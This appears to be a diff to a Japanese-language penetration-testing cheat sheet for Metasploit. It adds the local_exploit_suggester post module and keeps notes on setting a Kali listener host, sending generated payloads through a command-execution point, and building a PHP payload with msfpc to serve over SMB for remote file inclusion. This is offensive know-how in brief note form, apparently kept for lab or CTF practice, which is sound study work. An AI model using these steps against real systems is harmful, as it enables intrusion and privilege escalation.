@@ -21,6 +21,9 @@ set lhost <kali IP>
 set srvhost <kali IP>
 runするとペイロードが表示されるのでそれをPoC等コマンド実行できるもので送信する
 
+//local exploit
+use post/multi/recon/local_exploit_suggester
+
 //msfpc（MSFvenom Payload Creator）
 metasploitで動かすペイロードとコマンドセットを自動で作成してくれる。RFIなどで活用できる
 msfpc php <kali IP>　＃これで作成されるphpをsmbディレクトリに置く
